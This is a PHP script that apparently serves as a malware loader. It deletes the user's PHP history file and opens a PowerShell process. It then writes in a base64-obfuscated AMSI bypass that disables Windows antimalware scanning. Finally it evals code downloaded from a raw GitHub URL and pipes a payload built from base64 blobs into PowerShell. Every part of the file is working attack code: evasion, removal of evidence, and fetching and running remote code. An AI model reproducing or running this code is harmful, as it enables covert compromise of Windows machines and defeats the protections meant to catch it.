
file_put_contents("memtest.txt", "SIKERES");

if(getenv("USERPROFILE") != ""){
$userDir = getenv("USERPROFILE");
$file = $userDir."\\.php_history";
if(file_exists($file)) {
unlink($file);
}
}



$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
);

$process = proc_open('powershell', $descriptorspec, $pipes);

if (is_resource($process)) {
    fwrite($pipes[0], 'echo "SIKERES TESZT" > ptest.txt'."\n");
    fwrite($pipes[0], base64_decode("JGs9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpJytbY2hhcl04NSsndGlscycpLkdldEZpZWxkKCdhbXMnK1tjaGFyXTEwNSsnSW5pdEZhaWxlZCcsJ05vblB1YmxpYyxTdGF0aWMnKQokay5TZXRWYWx1ZSgkbnVsbCwkdHJ1ZSkKCg==")."\n");

    sleep(5);

    eval(file_get_contents("https://raw.githubusercontent.com/TotallyNotThat/testRep/main/file3"));
    $main = getData($b64_a1);
    $inside = base64_encode(getData($b64_a2));
    $finished = str_replace("___VALAMI___", $inside, $main);

    fwrite($pipes[0], $finished."\n");

    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

// It is important that you close any pipes before calling
// proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    //echo "command returned $return_value\n";
}





